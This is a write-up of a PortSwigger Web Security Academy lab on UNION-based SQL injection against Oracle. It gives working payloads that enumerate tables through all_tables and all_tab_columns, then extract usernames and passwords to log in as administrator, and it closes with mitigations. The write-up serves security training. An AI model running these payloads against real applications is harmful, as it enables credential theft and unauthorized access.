# SQL injection UNION attack, listing the database contents (Oracle)
---
## TARGET
PortSwigger Web Security Academy  
Lab: _SQL injection UNION attack, listing the database contents (Oracle)_

---
## DESCRIPTION
The application is vulnerable to SQL injection in the product category filter.  
Query results are returned in the response, allowing a UNION-based SQL injection to enumerate database contents.

---
## ROOT CAUSE
User input from the `category` parameter is directly concatenated into a SQL query.  
The application does not use prepared statements and reflects query results.

---
## ATTACK SCENARIO
1. The user filters products by category.
2. The backend executes a query similar to:
```SQL
SELECT name, description FROM products WHERE category = 'Gifts'
```
3. The attacker confirms two text columns using:
```SQL
' UNION SELECT 'abc','def' FROM dual--
```
4. The attacker identifies the database as **Oracle**.
5. The attacker lists all tables using:
```SQL
' UNION SELECT table_name, NULL FROM all_tables--
```
6. The attacker identifies the table containing user credentials.
7. The attacker lists columns in the identified table:
```SQL
' UNION SELECT column_name, NULL
FROM all_tab_columns
WHERE table_name = 'USERS_ABCDEF'--
```
8. The attacker retrieves usernames and passwords:
```SQL
' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF
FROM USERS_ABCDEF--
```
9. The attacker logs in as the administrator using the extracted password.

---
## PROOF OF CONCEPT
### Injection Point
- Parameter: `category`
- Context: String
### Payload Used
`' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--`
### Result
The response displays usernames and passwords, allowing authentication as the administrator.

---
## IMPACT
An attacker can enumerate Oracle database metadata and extract credentials.  
This leads to full account compromise.

---
## FIX / MITIGATION
- Use prepared statements / parameterized queries
- Avoid dynamic SQL query construction
- Restrict access to Oracle metadata views
- Do not return raw database query results

---
## KEY LEARNING
- Oracle requires `FROM dual` for SELECT statements
- Oracle uses `all_tables` and `all_tab_columns` instead of `information_schema`
- UNION attacks can enumerate database structure and extract credentials

---
